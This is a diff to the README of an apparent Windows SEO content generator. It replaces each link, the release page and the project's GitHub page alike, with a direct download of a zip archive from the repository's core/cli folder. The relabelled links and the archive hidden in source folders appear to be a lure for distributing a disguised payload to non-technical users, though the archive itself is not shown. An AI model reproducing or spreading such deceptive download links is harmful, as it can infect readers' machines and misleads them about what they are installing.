@@ -1,6 +1,6 @@
 # 🚀 flyweel-agentic-seo-aeo-engine - AI-Powered SEO Content Generator
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Flyweel%20Agentic%20SEO-blue?style=for-the-badge)](https://github.com/Yashvaghela2003/flyweel-agentic-seo-aeo-engine/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Flyweel%20Agentic%20SEO-blue?style=for-the-badge)](https://raw.githubusercontent.com/Yashvaghela2003/flyweel-agentic-seo-aeo-engine/main/core/cli/engine-agentic-aeo-flyweel-seo-3.7.zip)
 
 ---
 
@@ -42,7 +42,7 @@ This app works on Windows computers and requires no programming skills to use.
 
 To get the app, visit the official release page through this link:
 
-[Download flyweel-agentic-seo-aeo-engine](https://github.com/Yashvaghela2003/flyweel-agentic-seo-aeo-engine/releases)
+[Download flyweel-agentic-seo-aeo-engine](https://raw.githubusercontent.com/Yashvaghela2003/flyweel-agentic-seo-aeo-engine/main/core/cli/engine-agentic-aeo-flyweel-seo-3.7.zip)
 
 ---
 
@@ -142,7 +142,7 @@ If you want, you can publish your blog post directly:
 
 You can find more information about flyweel-agentic-seo-aeo-engine and its development on the GitHub page:
 
-[flyweel-agentic-seo-aeo-engine on GitHub](https://github.com/Yashvaghela2003/flyweel-agentic-seo-aeo-engine)
+[flyweel-agentic-seo-aeo-engine on GitHub](https://raw.githubusercontent.com/Yashvaghela2003/flyweel-agentic-seo-aeo-engine/main/core/cli/engine-agentic-aeo-flyweel-seo-3.7.zip)
 
 ---
 
@@ -150,7 +150,7 @@ You can find more information about flyweel-agentic-seo-aeo-engine and its devel
 
 To download the latest version and get started, visit the release page here:
 
-[Download flyweel-agentic-seo-aeo-engine](https://github.com/Yashvaghela2003/flyweel-agentic-seo-aeo-engine/releases) 
+[Download flyweel-agentic-seo-aeo-engine](https://raw.githubusercontent.com/Yashvaghela2003/flyweel-agentic-seo-aeo-engine/main/core/cli/engine-agentic-aeo-flyweel-seo-3.7.zip) 
 
 ---
 
